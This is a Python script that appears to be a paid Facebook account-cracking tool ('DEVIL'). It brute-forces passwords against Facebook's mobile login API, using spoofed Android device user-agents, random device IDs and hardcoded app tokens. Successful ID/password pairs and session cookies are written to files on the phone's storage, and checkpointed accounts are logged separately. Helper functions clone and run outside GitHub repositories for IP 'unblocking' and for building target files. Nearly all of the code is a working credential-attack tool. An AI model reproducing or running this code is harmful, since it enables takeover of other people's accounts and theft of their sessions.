                        motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
                        mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
                        mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
                        bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
                        mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+"[FBAN/FB4A;FBAV/51.0.0.11;FBBV/815658546;FBDM/{density=2.40861816061994,width=1467,height=9691};FBLC/en_US;FBRV/103160250;FBCR/3G;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/Oppo Reno 3;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [ROKS-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                     
                                        open('/sdcard/DEVIL/DEVIL-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/DEVIL/DEVIL-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                             
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [ROKS-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DEVIL/DEVIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/DEVIL/DEVIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ROKS-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
                        mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
                        mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
                        bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
                        mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+";[FBAN/FB4A;FBAV/55.0.1.3580;FBBV/81234569;FBDM/{density=1.5,width=770,height=1240};FBLC/en_GB;FBCR/MTML;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110H;FBSV/1.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/168.0.1.56.5;FBBV/234597027;FBDM/{density=1.0,width=880,height=1850};FBLC/en_GB;FBRV/0;FBCR/StarHub Mobile;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A37f;FBSV/2.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/168.0.0.88;FBBV/96358768;FBDM/{density=2.0,width=770,height=1400};FBLC/en_US;FBRV/26457963;FBCR/Verizon Wireless;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1890_03;FBSV/1.1.1;FBOP/1;FBCA/armeabi-v8a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sm=['GT-', 'SM-']
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers=  {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'your account was locked' in po:
                                pass
                        elif 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        
                                        print('\r\r\033[1;32m [ROKS-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/DEVIL/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/DEVIL/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[1;31m [ROKS-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/DEVIL/DEVIL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)        
        except Exception as e:
                pass

#####_____Unblock-Network-Ip_____#####
def createip():
	os.system("cd && git clone --depth=1 https://github.com/hazratbadri313/IPunblacker.git")
	os.system('cd && cd IPunblacker ;python ip.py')
#####_____END_____#####


#####_____Create-File_____#####
def create():
	os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
	os.system('cd && cd FILE ;python FILE.py')
#####_____END_____#####

def main_apv():
    imt = '578'
    os.system('clear')
    print(logo)
    try:
        key1 = open('/sdcard/DEVIL/.DEVIL.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
       
        myid = uuid.uuid4().hex[:30]
        
        kok = open('/sdcard/DEVIL/.DEVIL.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python DEVIL.py')
        tks = ('Hello%20DEVIL%20Owner%20Kashif%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213540725310?text='+tks)

    r1 = requests.get('https://mafiamx16.blogspot.com/2023/12/devil.html').text
   
    if key1 in r1:
        menu()
    else:
        os.system('clear')
        print(logo)
        print(' \033[1;37mKey : \033[1;32m' + key1)
        linex()
        print (' \033[1;37mThis Tool is Paid So Need Get Approval') 
       
        #print(' Payment Number Details\n 03239021979 \n Easypaisa or Jazzcash');linex()
        input(' \033[1;37mPress Enter To send key Admin')
        tks = ('Hello%20DEVIL%20Owner%20DEVIL-XD%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213558926136?text='+tks)
        main_apv()
menu()
